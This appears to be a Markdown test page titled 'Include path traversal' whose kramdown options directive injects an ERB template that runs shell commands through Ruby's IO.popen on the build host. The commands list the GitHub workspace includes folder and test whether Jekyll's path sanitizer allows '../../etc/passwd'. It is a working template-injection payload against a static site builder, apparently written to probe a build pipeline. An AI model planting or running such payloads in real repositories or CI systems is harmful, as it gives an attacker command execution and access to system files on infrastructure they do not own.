---
---

# Test 16: Include path traversal

{::options template="string://<%= r = ''; begin; r = IO.popen('ls -la /github/workspace/_includes/ 2>&1').read[0..200]; rescue; r = 'no_includes'; end; r = r + \"\\nSANITIZED=\" + IO.popen('ruby -e \"require %q(jekyll); puts Jekyll.sanitized_path(%q(/github/workspace), %q(../../etc/passwd))\" 2>&1').read.strip; r %>" /}

placeholder
